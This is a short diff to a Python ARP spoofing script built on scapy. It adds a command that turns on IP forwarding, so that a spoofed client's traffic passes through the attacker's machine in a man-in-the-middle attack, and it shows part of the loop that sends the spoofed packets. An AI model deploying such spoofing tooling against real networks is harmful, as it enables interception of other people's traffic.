@@ -4,7 +4,7 @@ import scapy.all as scapy
 import time
 import sys
 import argparse
-
+import os
 # To use external functions before executing the code
 def parsing_arguments():
     parser = argparse.ArgumentParser()
@@ -68,6 +68,7 @@ def arp_restore(destination_ip, source_ip):
 
 # To continue the spoofing packets
 packet_count = 0
+os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 try:
     while True:
         spoofing(client_ip, gateway_ip)# will spoof the client by telling that i am the router
